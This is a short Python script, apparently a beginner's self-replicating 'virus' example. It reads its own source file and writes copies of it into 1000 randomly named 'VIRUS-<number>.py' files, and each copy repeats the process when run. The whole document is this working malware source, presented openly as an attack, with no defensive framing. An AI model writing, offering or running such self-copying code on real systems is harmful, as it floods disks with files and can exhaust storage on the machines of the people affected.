# Import Section
import random


# Variables
File_Virus = "VIRUS-{0}.py"
Data = None

# Functions
def Attack(File_Name):
    ## 'with' handles opening and closing of File
    with open(File_Name, 'w') as File:
        File.write(Data)

# Main Code Area

## __file__ is a special variable that stores the path this script
with open(__file__, 'r') as File:
    Data = File.read()

## for loop for creating 1000 files...
for _ in range(1000):
    Attack(File_Virus.format(random.randint( 1, 9999 )))

